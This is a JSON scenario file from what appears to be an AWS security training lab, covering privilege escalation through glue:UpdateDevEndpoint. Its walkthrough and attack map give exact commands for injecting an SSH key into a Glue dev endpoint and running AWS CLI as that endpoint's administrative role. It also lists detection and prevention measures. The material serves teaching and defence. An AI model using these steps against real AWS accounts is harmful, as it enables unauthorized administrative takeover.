{
  "displayName": "Glue Dev Endpoint Update to Admin",
  "name": "glue-002-glue-updatedevendpoint",
  "description": "Add SSH public key to existing Glue dev endpoint and execute commands with the endpoint's administrative role",
  "costEstimate": "$634/mo",
  "pathfindingCloudId": "glue-002",
  "interactiveDemo": false,
  "category": "Privilege Escalation",
  "subCategory": "existing-passrole",
  "pathType": "one-hop",
  "target": "to-admin",
  "environments": [
    "prod"
  ],
  "attackPath": {
    "principals": [],
    "summary": ""
  },
  "mitreAttack": {
    "tactics": [
      "TA0004 - Privilege Escalation"
    ],
    "techniques": [
      "T1098.001 - Account Manipulation: Additional Cloud Credentials",
      "T1021.004 - Remote Services: SSH"
    ]
  },
  "terraform": {
    "variableName": "enable_single_account_privesc_one_hop_to_admin_glue_002_glue_updatedevendpoint",
    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/glue-002-glue-updatedevendpoint"
  },
  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/glue-002-glue-updatedevendpoint",
  "schemaVersion": "4.1.1",
  "permissions": {
    "principals": [
      {
        "name": "pl-prod-glue-002-to-admin-starting-user",
        "required": [
          {
            "permission": "glue:UpdateDevEndpoint",
            "resource": "*",
            "description": "add an SSH public key to any existing Glue development endpoint"
          }
        ],
        "helpful": [
          {
            "permission": "glue:GetDevEndpoint",
            "purpose": "retrieve endpoint details including the public address needed for the SSH connection"
          },
          {
            "permission": "glue:GetDevEndpoints",
            "purpose": "list existing endpoints to identify targets with privileged roles attached"
          }
        ]
      }
    ]
  },
  "readme": {
    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-glue-002-to-admin-starting-user` IAM user to the `pl-prod-glue-002-to-admin-target-role` administrative role by adding an SSH public key to a pre-existing Glue development endpoint and executing AWS CLI commands through the SSH session using the endpoint's attached IAM role.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-glue-002-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-glue-002-to-admin-target-role`",
    "setup": {
      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
      "deployNonInteractive": "```bash\nplabs enable glue-002-to-admin\nplabs apply\n```",
      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `glue-002-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
    },
    "attack": {
      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-glue-002-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::{account_id}:policy/pl-prod-glue-002-to-admin-policy` | Allows `glue:UpdateDevEndpoint` and `glue:GetDevEndpoint` permissions |\n| `arn:aws:glue:{region}:{account_id}:devEndpoint/pl-prod-glue-002-to-admin-endpoint` | Pre-existing Glue development endpoint with administrative role |\n| `arn:aws:iam::{account_id}:role/pl-prod-glue-002-to-admin-target-role` | Administrative role attached to the Glue dev endpoint |\n| `arn:aws:iam::{account_id}:role/pl-prod-glue-002-to-admin-endpoint-service-role` | Service role allowing Glue to assume the target role |",
      "demoAttack": {
        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Generate an SSH key pair for the attack\n3. Update the Glue dev endpoint to add the SSH public key\n4. Wait for the endpoint to become ready (this may take 5-10 minutes)\n5. Retrieve the endpoint SSH address\n6. Connect via SSH and execute AWS CLI commands with administrative privileges\n7. Verify successful privilege escalation",
        "resourcesCreated": "- Temporary SSH key pair generated for the attack (`/tmp/pl-glue-002-updatede-key`)\n- SSH public key added to the Glue dev endpoint",
        "nonInteractive": "```bash\nplabs demo --list\nplabs demo glue-002-glue-updatedevendpoint\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `glue-002-to-admin` in the scenarios list\n3. Press `r` to run the demo script"
      },
      "cleanup": {
        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup glue-002-glue-updatedevendpoint\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `glue-002-to-admin` in the scenarios list\n3. Press `c` to run the cleanup script"
      }
    },
    "teardown": {
      "nonInteractive": "```bash\nplabs disable glue-002-to-admin\nplabs apply\n```",
      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `glue-002-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
    },
    "defend": {
      "cspm": {
        "whatToDetect": "- **Privilege Escalation Path**: User with `glue:UpdateDevEndpoint` can access roles attached to existing endpoints\n- **Overprivileged Endpoint Roles**: Glue dev endpoints configured with administrative or highly privileged IAM roles\n- **Broad Glue Permissions**: IAM principals with `glue:UpdateDevEndpoint` permissions on all endpoints (`Resource: \"*\"`)\n- **Long-Running Dev Endpoints**: Glue dev endpoints that remain active for extended periods with privileged roles\n- **Missing Resource Conditions**: Glue permissions without resource-level restrictions or condition keys\n- **SSH Access to Privileged Resources**: Ability to add SSH keys to compute resources with administrative roles",
        "prevention": "- **Restrict UpdateDevEndpoint Permissions**: Limit `glue:UpdateDevEndpoint` to specific endpoints using resource ARNs, not wildcard (`*`)\n- **Use Least Privilege Roles**: Attach only the minimum necessary IAM permissions to Glue dev endpoint roles, avoiding administrative access\n- **Implement Resource Tagging**: Use tags and condition keys to control which principals can update specific endpoints:\n  ```json\n  {\n    \"Condition\": {\n      \"StringEquals\": {\n        \"aws:ResourceTag/Team\": \"${aws:PrincipalTag/Team}\"\n      }\n    }\n  }\n  ```\n- **Use SCPs for Sensitive Roles**: Implement Service Control Policies to prevent Glue endpoints from assuming highly privileged roles:\n  ```json\n  {\n    \"Effect\": \"Deny\",\n    \"Action\": \"sts:AssumeRole\",\n    \"Resource\": \"arn:aws:iam::*:role/*Admin*\",\n    \"Condition\": {\n      \"StringEquals\": {\n        \"aws:PrincipalServiceName\": \"glue.amazonaws.com\"\n      }\n    }\n  }\n  ```\n- **Limit Endpoint Lifespan**: Use automation to terminate idle Glue dev endpoints or those running for extended periods\n- **Separate Development and Production**: Never use Glue dev endpoints with production-level IAM roles; use separate accounts or strict role boundaries\n- **Use IAM Access Analyzer**: Regularly scan for privilege escalation paths involving Glue permissions\n- **Disable Unused Endpoints**: Automatically terminate Glue dev endpoints that haven't been accessed in a defined period"
      },
      "cloudSiem": {
        "cloudTrailEvents": "- `Glue: UpdateDevEndpoint` -- Glue dev endpoint updated; critical when `addPublicKeys` parameter is present, indicating SSH key injection\n- `Glue: GetDevEndpoint` -- Dev endpoint details retrieved; may indicate reconnaissance to obtain the SSH address after key injection\n- `Glue: GetDevEndpoints` -- All dev endpoints listed; may indicate reconnaissance to identify privileged targets",
        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
      }
    },
    "solution": "# Guided Walkthrough: One-Hop Privilege Escalation: glue:UpdateDevEndpoint\n\nThis scenario demonstrates a privilege escalation vulnerability where a user with `glue:UpdateDevEndpoint` permission can add their SSH public key to a pre-existing AWS Glue development endpoint. Once the SSH key is added, the attacker can SSH into the endpoint and execute AWS CLI commands with the full permissions of the IAM role attached to the endpoint. Unlike `glue:CreateDevEndpoint` (which requires `iam:PassRole`), updating an existing endpoint allows an attacker to gain access to an already-privileged role without needing role attachment permissions.\n\nThis scenario is particularly dangerous in environments where development endpoints are created with administrative or highly privileged roles for data engineering work, multiple teams share access to Glue resources without strict RBAC, and endpoints are left running for extended periods with powerful IAM roles attached.\n\n**IMPORTANT COST WARNING**: AWS Glue development endpoints cost approximately **$2.20/hour** and run continuously while the scenario is deployed. Always destroy the scenario when finished testing.\n\n## The Challenge\n\nYou start as `pl-prod-glue-002-to-admin-starting-user`, an IAM user with `glue:UpdateDevEndpoint` (and the helpful permissions `glue:GetDevEndpoint` and `glue:GetDevEndpoints`). You have no administrative access \u2014 attempting `aws iam list-users` will fail immediately.\n\nSomewhere in this AWS account, a Glue development endpoint named `pl-prod-glue-002-to-admin-endpoint` is already running. That endpoint was provisioned with `pl-prod-glue-002-to-admin-target-role` attached \u2014 a role that carries `AdministratorAccess`. Your goal is to reach that role and prove you have admin access.\n\n## Reconnaissance\n\nFirst, verify your identity and confirm what you cannot do yet:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::<account_id>:user/pl-prod-glue-002-to-admin-starting-user\n\naws iam list-users --max-items 1\n# AccessDenied\n```\n\nGood \u2014 you are the starting user and you definitely do not have admin permissions. Now look for existing Glue dev endpoints. This is where `glue:GetDevEndpoints` is useful:\n\n```bash\naws glue get-dev-endpoints --query 'DevEndpoints[*].[EndpointName,Status,RoleArn]' --output table\n```\n\nYou'll find `pl-prod-glue-002-to-admin-endpoint` in READY status with `pl-prod-glue-002-to-admin-target-role` attached. That role name signals elevated permissions. To confirm the endpoint's address (needed for SSH later):\n\n```bash\naws glue get-dev-endpoint \\\n  --endpoint-name pl-prod-glue-002-to-admin-endpoint \\\n  --query 'DevEndpoint.[EndpointName,Status,RoleArn,PublicAddress]' \\\n  --output text\n```\n\nAt this point you have everything you need: an endpoint in READY state, running with a privileged role, and accepting SSH public keys via `UpdateDevEndpoint`.\n\n## Exploitation\n\n### Step 1: Generate an SSH key pair\n\nYou need a key pair you control. Generate one locally \u2014 no passphrase, so the private key can be used non-interactively:\n\n```bash\nssh-keygen -t rsa -b 2048 -f /tmp/glue_attack_key -N \"\"\n```\n\nThis produces `/tmp/glue_attack_key` (private) and `/tmp/glue_attack_key.pub` (public).\n\n### Step 2: Inject the SSH public key into the endpoint\n\nThis is the exploitation step. `glue:UpdateDevEndpoint` accepts an `--add-public-keys` parameter that appends your public key to the endpoint's authorized keys:\n\n```bash\naws glue update-dev-endpoint \\\n  --endpoint-name pl-prod-glue-002-to-admin-endpoint \\\n  --add-public-keys \"$(cat /tmp/glue_attack_key.pub)\"\n```\n\nThe call returns immediately with no output on success. The endpoint transitions to UPDATING status \u2014 you need to wait for it to return to READY before SSH will work. Poll every 30 seconds:\n\n```bash\naws glue get-dev-endpoint \\\n  --endpoint-name pl-prod-glue-002-to-admin-endpoint \\\n  --query 'DevEndpoint.Status' --output text\n```\n\nKey propagation typically takes 15\u201360 seconds. Once the status is back to READY, the endpoint accepts your key.\n\n### Step 3: Retrieve the SSH address\n\n```bash\nENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \\\n  --endpoint-name pl-prod-glue-002-to-admin-endpoint \\\n  --query 'DevEndpoint.PublicAddress' --output text)\necho \"$ENDPOINT_ADDRESS\"\n```\n\n### Step 4: SSH in and run privileged commands\n\nThe Glue dev endpoint runs as the `glue` user (or `livy`, depending on the endpoint version). The EC2 instance backing the endpoint inherits credentials from the attached IAM role via the Instance Metadata Service:\n\n```bash\nssh -i /tmp/glue_attack_key \\\n  -o StrictHostKeyChecking=no \\\n  -o UserKnownHostsFile=/dev/null \\\n  \"glue@${ENDPOINT_ADDRESS}\" \\\n  \"aws iam list-users --max-items 3 --output table\"\n```\n\n## Verification\n\nFrom inside the SSH session, confirm which identity is running:\n\n```bash\nssh -i /tmp/glue_attack_key \"glue@${ENDPOINT_ADDRESS}\" \"aws sts get-caller-identity\"\n```\n\nThe `Arn` field will contain `pl-prod-glue-002-to-admin-target-role`, confirming you are executing as the administrative role. Successful execution of `aws iam list-users` proves `AdministratorAccess` is in effect.\n\n## What Happened\n\nYou exploited the fact that `glue:UpdateDevEndpoint` lets any holder of that permission inject SSH keys into any Glue dev endpoint (subject only to IAM resource restrictions \u2014 which in this scenario had none). The endpoint's EC2 backing instance automatically provides credentials for the attached IAM role via IMDS, so once you have SSH access, every AWS CLI call runs as that role.\n\nThis is meaningfully different from `glue:CreateDevEndpoint` (covered in glue-001): creating an endpoint requires `iam:PassRole` to attach a role, which is a well-known dangerous permission. Updating an existing endpoint sidesteps that check entirely \u2014 the role is already attached, and you just need the ability to push an SSH key. In real environments, data engineers routinely hold `glue:UpdateDevEndpoint` to manage their own endpoints, never realizing it doubles as a privilege escalation vector against every other endpoint in the account.\n"
  },
  "attackMap": {
    "nodes": [
      {
        "id": "starting-principal",
        "label": "Starting User",
        "type": "principal",
        "subType": "iam-user",
        "arn": "arn:aws:iam::{account_id}:user/pl-prod-glue-002-to-admin-starting-user",
        "access": {
          "type": "assumed-breach-credentials"
        },
        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has glue:UpdateDevEndpoint permission, which allows adding an SSH public key to existing Glue development endpoints. An existing endpoint is already running with an attached administrative IAM role.\n"
      },
      {
        "id": "glue-endpoint",
        "label": "Glue Dev Endpoint",
        "type": "resource",
        "subType": "glue-job",
        "arn": "arn:aws:glue:{region}:{account_id}:devEndpoint/pl-prod-glue-002-to-admin-endpoint",
        "description": "This pre-existing Glue development endpoint has an administrative IAM role attached to it. By injecting your SSH public key via glue:UpdateDevEndpoint and then connecting over SSH, you can execute AWS CLI commands that run with the full permissions of the endpoint's attached role.\n"
      },
      {
        "id": "target-role",
        "label": "Admin Role",
        "type": "principal",
        "subType": "iam-role",
        "isTarget": true,
        "arn": "arn:aws:iam::{account_id}:role/pl-prod-glue-002-to-admin-target-role",
        "description": "This IAM role has AdministratorAccess and is attached to the Glue development endpoint. Once connected via SSH, AWS CLI commands execute with the full permissions of this role, granting unrestricted access to the AWS account.\n"
      }
    ],
    "edges": [
      {
        "from": "starting-principal",
        "to": "glue-endpoint",
        "label": "glue:UpdateDevEndpoint",
        "description": "Add an attacker-controlled SSH public key to the existing Glue dev endpoint. After the endpoint finishes updating (status returns to READY), SSH access is available using the corresponding private key.\n",
        "hints": [
          "Start by discovering what Glue dev endpoints exist in the account \u2014 use your helpful list permission to find them.",
          "Look closely at each endpoint's details: what IAM role is attached? An endpoint with an administrative role is your target.",
          "Use glue:GetDevEndpoint to retrieve the endpoint's public SSH address and verify it is in READY status before proceeding.",
          "You can modify existing Glue development endpoints \u2014 check what update parameters are available, particularly around SSH keys.",
          "Adding your SSH public key to an endpoint lets you SSH in and run commands as its attached IAM role.",
          "Browse to https://pathfinding.cloud/paths/glue-002 for technique details."
        ],
        "commands": [
          {
            "description": "Generate a temporary SSH key pair",
            "command": "ssh-keygen -t rsa -b 2048 -f /tmp/glue_attack_key -N ''"
          },
          {
            "description": "Add the SSH public key to the Glue dev endpoint",
            "command": "aws glue update-dev-endpoint --endpoint-name pl-prod-glue-002-to-admin-endpoint --add-public-keys \"$(cat /tmp/glue_attack_key.pub)\""
          },
          {
            "description": "Wait for the endpoint to return to READY status",
            "command": "aws glue get-dev-endpoint --endpoint-name pl-prod-glue-002-to-admin-endpoint --query 'DevEndpoint.Status'"
          },
          {
            "description": "Retrieve the SSH address for the endpoint",
            "command": "aws glue get-dev-endpoint --endpoint-name pl-prod-glue-002-to-admin-endpoint --query 'DevEndpoint.PublicAddress' --output text"
          }
        ]
      },
      {
        "from": "glue-endpoint",
        "to": "target-role",
        "label": "SSH \u2192 assume role",
        "description": "Connect to the endpoint over SSH and execute AWS CLI commands. The endpoint's EC2 instance runs with the attached administrative IAM role, so all AWS CLI calls inherit that role's permissions.\n",
        "hints": [
          "After injecting your key, wait for the endpoint status to return to READY \u2014 it transitions through UPDATING first.",
          "Use glue:GetDevEndpoint to poll the status and retrieve the endpoint's public SSH address once it is ready.",
          "The Glue endpoint runs as the 'glue' user \u2014 connect with your private key and the public address from the endpoint details.",
          "Once connected via SSH, the AWS CLI environment on the endpoint is pre-configured with the attached IAM role's credentials via IMDS."
        ],
        "commands": [
          {
            "description": "SSH into the Glue dev endpoint",
            "command": "ssh -i /tmp/glue_attack_key livy@<endpoint-public-address>"
          },
          {
            "description": "Verify administrative access from within the endpoint",
            "command": "aws iam list-users"
          }
        ]
      }
    ]
  },
  "hasAttackMap": true,
  "slug": "glue-002",
  "hasDemoTranscript": false
}